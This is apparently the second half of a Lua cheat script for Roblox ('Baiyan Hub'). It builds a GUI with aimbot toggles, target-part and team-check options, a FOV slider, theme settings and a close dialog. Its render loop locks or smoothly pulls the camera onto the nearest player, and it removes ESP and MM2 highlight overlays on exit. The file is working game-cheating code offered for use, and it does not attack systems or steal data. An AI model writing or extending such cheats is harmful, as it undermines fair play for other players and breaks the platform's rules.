    ShowFOVCircle = not ShowFOVCircle
    btn.Text = "SHOW FOV: " .. (ShowFOVCircle and "ON" or "OFF")
end)

CreateAimButton("AIM PART: HEAD", 133, function(btn)
    if TargetPart == "Head" then
        TargetPart = "HumanoidRootPart"
        btn.Text = "AIM PART: HRP"
    else
        TargetPart = "Head"
        btn.Text = "AIM PART: HEAD"
    end
    CurrentTarget = GetClosestPlayerToCrosshair()
end)

CreateAimButton("TEAM CHECK: OFF", 165, function(btn)
    TeamCheck = not TeamCheck
    btn.Text = "TEAM CHECK: " .. (TeamCheck and "ON" or "OFF")
    if TeamCheck and CurrentTarget and IsTeammate(CurrentTarget) then
        CurrentTarget = nil
    end
end)

-- AIM FOV 調整滑桿 (Slider)
local function CreateSlider(text, yPos, minVal, maxVal, defaultVal, callback)
    local container = Instance.new("Frame", AimContent)
    container.Size = UDim2.new(1, -6, 0, 36)
    container.Position = UDim2.new(0, 3, 0, yPos)
    container.BackgroundColor3 = Themes.Dark.Button
    container.BorderSizePixel = 0
    Instance.new("UICorner", container).CornerRadius = UDim.new(0, 5)
    table.insert(buttonReferences, container)

    local label = Instance.new("TextLabel", container)
    label.Size = UDim2.new(1, 0, 0, 16)
    label.Position = UDim2.new(0, 0, 0, 2)
    label.BackgroundTransparency = 1
    label.Text = text .. ": " .. defaultVal
    label.TextColor3 = Themes.Dark.Text
    label.Font = Enum.Font.GothamBold
    label.TextSize = 9

    local sliderBg = Instance.new("Frame", container)
    sliderBg.Size = UDim2.new(1, -16, 0, 6)
    sliderBg.Position = UDim2.new(0, 8, 0, 22)
    sliderBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    sliderBg.BorderSizePixel = 0
    Instance.new("UICorner", sliderBg).CornerRadius = UDim.new(0, 3)

    local sliderFill = Instance.new("Frame", sliderBg)
    sliderFill.Size = UDim2.new((defaultVal - minVal) / (maxVal - minVal), 0, 1, 0)
    sliderFill.BackgroundColor3 = Color3.fromRGB(50, 150, 100)
    sliderFill.BorderSizePixel = 0
    Instance.new("UICorner", sliderFill).CornerRadius = UDim.new(0, 3)

    local draggingSlider = false
    local function updateValue(input)
        local pos = math.clamp((input.Position.X - sliderBg.AbsolutePosition.X) / sliderBg.AbsoluteSize.X, 0, 1)
        local val = math.floor(minVal + (maxVal - minVal) * pos)
        sliderFill.Size = UDim2.new(pos, 0, 1, 0)
        label.Text = text .. ": " .. val
        callback(val)
    end

    sliderBg.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            draggingSlider = true
            updateValue(input)
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            draggingSlider = false
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if draggingSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            updateValue(input)
        end
    end)

    return container
end

CreateSlider("AIM FOV", 197, 50, 500, FOVRadius, function(val)
    FOVRadius = val
end)

-- 後台設定與確認視窗
local SettingsFrame = Instance.new("Frame", Frame)
SettingsFrame.Size = UDim2.new(1, 0, 1, 0)
SettingsFrame.BackgroundColor3 = Themes.Dark.Background
SettingsFrame.Visible = false
SettingsFrame.ZIndex = 20
Instance.new("UICorner", SettingsFrame).CornerRadius = UDim.new(0, 10)

local SettingsTitle = Instance.new("TextLabel", SettingsFrame)
SettingsTitle.Size = UDim2.new(1, 0, 0, 35)
SettingsTitle.Position = UDim2.new(0, 0, 0, 5)
SettingsTitle.Text = "SETTINGS"
SettingsTitle.TextColor3 = Themes.Dark.Text
SettingsTitle.Font = Enum.Font.GothamBold
SettingsTitle.TextSize = 12
SettingsTitle.BackgroundTransparency = 1
SettingsTitle.ZIndex = 21

local ThemeLabel = Instance.new("TextLabel", SettingsFrame)
ThemeLabel.Size = UDim2.new(1, -20, 0, 20)
ThemeLabel.Position = UDim2.new(0, 10, 0, 40)
ThemeLabel.Text = "THEME:"
ThemeLabel.TextColor3 = Themes.Dark.Text
ThemeLabel.Font = Enum.Font.GothamBold
ThemeLabel.TextSize = 10
ThemeLabel.BackgroundTransparency = 1
ThemeLabel.TextXAlignment = Enum.TextXAlignment.Left
ThemeLabel.ZIndex = 21

local DarkThemeBtn = Instance.new("TextButton", SettingsFrame)
DarkThemeBtn.Size = UDim2.new(0.45, -5, 0, 28)
DarkThemeBtn.Position = UDim2.new(0, 10, 0, 65)
DarkThemeBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 100)
DarkThemeBtn.Text = "DARK"
DarkThemeBtn.TextColor3 = Color3.new(1,1,1)
DarkThemeBtn.Font = Enum.Font.GothamBold
DarkThemeBtn.TextSize = 10
DarkThemeBtn.ZIndex = 21

local LightThemeBtn = Instance.new("TextButton", SettingsFrame)
LightThemeBtn.Size = UDim2.new(0.45, -5, 0, 28)
LightThemeBtn.Position = UDim2.new(0.55, 0, 0, 65)
LightThemeBtn.BackgroundColor3 = Themes.Dark.Button
LightThemeBtn.Text = "LIGHT"
LightThemeBtn.TextColor3 = Themes.Dark.Text
LightThemeBtn.Font = Enum.Font.GothamBold
LightThemeBtn.TextSize = 10
LightThemeBtn.ZIndex = 21

local BackBtn = Instance.new("TextButton", SettingsFrame)
BackBtn.Size = UDim2.new(0.9, 0, 0, 28)
BackBtn.Position = UDim2.new(0.05, 0, 1, -40)
BackBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
BackBtn.Text = "BACK"
BackBtn.TextColor3 = Color3.new(1,1,1)
BackBtn.Font = Enum.Font.GothamBold
BackBtn.TextSize = 10
BackBtn.ZIndex = 21

Instance.new("UICorner", DarkThemeBtn).CornerRadius = UDim.new(0, 6)
Instance.new("UICorner", LightThemeBtn).CornerRadius = UDim.new(0, 6)
Instance.new("UICorner", BackBtn).CornerRadius = UDim.new(0, 6)

local ConfirmFrame = Instance.new("Frame", Frame)
ConfirmFrame.Size = UDim2.new(1, 0, 1, 0)
ConfirmFrame.BackgroundColor3 = Themes.Dark.Background
ConfirmFrame.Visible = false
ConfirmFrame.ZIndex = 25
ConfirmFrame.BackgroundTransparency = 0.05
Instance.new("UICorner", ConfirmFrame).CornerRadius = UDim.new(0, 10)

local ConfirmText = Instance.new("TextLabel", ConfirmFrame)
ConfirmText.Size = UDim2.new(1, -20, 0, 50)
ConfirmText.Position = UDim2.new(0, 10, 0, 60)
ConfirmText.Text = "Are you sure you want\nto close the GUI?"
ConfirmText.TextColor3 = Themes.Dark.Text
ConfirmText.Font = Enum.Font.GothamBold
ConfirmText.TextSize = 11
ConfirmText.BackgroundTransparency = 1
ConfirmText.ZIndex = 26

local YesBtn = Instance.new("TextButton", ConfirmFrame)
YesBtn.Size = UDim2.new(0, 80, 0, 28)
YesBtn.Position = UDim2.new(0, 16, 1, -45)
YesBtn.BackgroundColor3 = Color3.fromRGB(50, 180, 100)
YesBtn.Text = "YES"
YesBtn.TextColor3 = Color3.new(1,1,1)
YesBtn.Font = Enum.Font.GothamBold
YesBtn.TextSize = 10
YesBtn.ZIndex = 26

local NoBtn = Instance.new("TextButton", ConfirmFrame)
NoBtn.Size = UDim2.new(0, 80, 0, 28)
NoBtn.Position = UDim2.new(1, -96, 1, -45)
NoBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
NoBtn.Text = "NO"
NoBtn.TextColor3 = Color3.new(1,1,1)
NoBtn.Font = Enum.Font.GothamBold
NoBtn.TextSize = 10
NoBtn.ZIndex = 26

Instance.new("UICorner", YesBtn).CornerRadius = UDim.new(0, 6)
Instance.new("UICorner", NoBtn).CornerRadius = UDim.new(0, 6)

--// 統一主題切換函數
local function ApplyTheme(themeName)
    local colors = Themes[themeName]
    CurrentTheme = themeName

    Frame.BackgroundColor3 = colors.Background
    TitleBar.BackgroundColor3 = colors.TitleBar
    TitleFix.BackgroundColor3 = colors.TitleBar
    Title.TextColor3 = colors.Text

    SettingsBtn.BackgroundColor3 = colors.TopButtons
    SettingsBtn.TextColor3 = colors.Text
    MinimizeBtn.BackgroundColor3 = colors.TopButtons
    MinimizeBtn.TextColor3 = colors.Text
    CloseBtn.BackgroundColor3 = colors.TopButtons
    CloseBtn.TextColor3 = colors.Text

    for _, btn in ipairs(buttonReferences) do
        if btn:IsA("TextButton") then
            btn.BackgroundColor3 = colors.Button
            btn.TextColor3 = colors.Text
        elseif btn:IsA("Frame") then
            btn.BackgroundColor3 = colors.Button
            for _, child in ipairs(btn:GetChildren()) do
                if child:IsA("TextLabel") then
                    child.TextColor3 = colors.Text
                end
            end
        end
    end

    SettingsFrame.BackgroundColor3 = colors.Background
    SettingsTitle.TextColor3 = colors.Text
    ThemeLabel.TextColor3 = colors.Text
    ConfirmFrame.BackgroundColor3 = colors.Background
    ConfirmText.TextColor3 = colors.Text

    if themeName == "Dark" then
        DarkThemeBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 100)
        DarkThemeBtn.TextColor3 = Color3.new(1,1,1)
        LightThemeBtn.BackgroundColor3 = colors.Button
        LightThemeBtn.TextColor3 = colors.Text
    else
        LightThemeBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 100)
        LightThemeBtn.TextColor3 = Color3.new(1,1,1)
        DarkThemeBtn.BackgroundColor3 = colors.Button
        DarkThemeBtn.TextColor3 = colors.Text
    end
end

DarkThemeBtn.MouseButton1Click:Connect(function() ApplyTheme("Dark") end)
LightThemeBtn.MouseButton1Click:Connect(function() ApplyTheme("Light") end)
BackBtn.MouseButton1Click:Connect(function() SettingsFrame.Visible = false end)

SettingsBtn.MouseButton1Click:Connect(function()
    if ConfirmFrame.Visible then return end
    SettingsFrame.Visible = not SettingsFrame.Visible
end)

local isMinimized = false
MinimizeBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    if isMinimized then
        TweenService:Create(Frame, TweenInfo.new(0.1), {Size = UDim2.new(0, UIWidth, 0, 30)}):Play()
        MinimizeBtn.Text = "+"
    else
        TweenService:Create(Frame, TweenInfo.new(0.1), {Size = UDim2.new(0, UIWidth, 0, UIHeight)}):Play()
        MinimizeBtn.Text = "−"
    end
end)

CloseBtn.MouseButton1Click:Connect(function()
    ConfirmFrame.Visible = true
end)

NoBtn.MouseButton1Click:Connect(function()
    ConfirmFrame.Visible = false
end)

YesBtn.MouseButton1Click:Connect(function()
    for id, _ in pairs(ESP) do removeESP(id) end
    clearAllMM2Highlights()
    if FOVCircle then pcall(function() FOVCircle:Remove() end) end
    MainGui:Destroy()
end)

--// 核心迴圈
RunService:BindToRenderStep("Aimbot_Nova", Enum.RenderPriority.Camera.Value + 1, function()
    UpdateFOVCircle()

    if not AimbotActive then return end

    if CurrentTarget and IsTeammate(CurrentTarget) then
        CurrentTarget = nil
    end

    if CameraWriteBlocked then return end

    if not CurrentTarget or not CurrentTarget.Character or not CurrentTarget.Character.Parent or not isAlive(CurrentTarget.Character) then
        CurrentTarget = GetClosestPlayerToCrosshair()
    end

    if CurrentTarget and CurrentTarget.Character then
        local bone = GetAimPart(CurrentTarget)
        if bone then
            if WallcheckActive and not CheckWallVisibility(bone, CurrentTarget.Character) then
                return
            end

            local cam = GetCamera()
            local targetCF = CFrame.new(cam.CFrame.Position, bone.Position)

            if StrongLock then
                local ok = pcall(function() cam.CFrame = targetCF end)
                if not ok then
                    CameraWriteBlocked = true
                    AimbotActive = false
                    return
                end
            else
                local ok = pcall(function() cam.CFrame = cam.CFrame:Lerp(targetCF, Smoothness) end)
                if not ok then
                    CameraWriteBlocked = true
                    AimbotActive = false
                    return
                end
            end
            return
        end
    end
end)

UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == AimBind then
        AimbotActive = not AimbotActive
        AimbotBtn.Text = "AIMBOT: " .. (AimbotActive and "ON [Q]" or "OFF [Q]")
        if AimbotActive then CurrentTarget = GetClosestPlayerToCrosshair() end
    elseif input.KeyCode == SwitchTargetBind then
        CurrentTarget = GetClosestPlayerToCrosshair()
    elseif input.KeyCode == HideKey then
        Frame.Visible = not Frame.Visible
    end
end)

-- 開場動畫
Frame.Size = UDim2.new(0, 0, 0, 0)
Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
TweenService:Create(Frame, TweenInfo.new(0.1, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0, UIWidth, 0, UIHeight),
    Position = UDim2.new(0.5, -(UIWidth/2), 0.5, -(UIHeight/2))
}):Play()

Notify("Loaded", "Baiyan Hub: Aim Ported Successfully (TeamCheck OFF)", 3)
